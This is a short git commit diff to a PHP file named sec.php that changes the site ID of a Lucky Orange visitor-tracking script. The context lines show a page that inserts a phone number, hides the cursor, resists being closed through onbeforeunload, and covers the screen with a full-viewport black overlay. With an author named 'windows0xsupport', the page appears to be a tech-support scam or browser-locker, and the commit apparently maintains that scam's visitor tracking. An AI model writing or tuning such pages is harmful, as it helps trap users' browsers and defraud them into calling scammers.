aa1b765216a9c7898a07404ed1424b03c4d09da7
windows0xsupport <ankitkatariacool9@gmail.com>
2026-05-20 19:53:45 +0900

    url2

--- sec.php
+++ sec.php
@@ -114,7 +114,7 @@ $codeString = '
          var phone_number = "' . $number . '";
          
       </script>
-     <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=2bc12fdd"></script>
+    <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=42c623bb"></script>
    </head>
    <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
 <div id="floatbox" style="position: fixed;z-index: 999999999;height: 100vh;width: 100vw;background: black;" class="bxcontb">
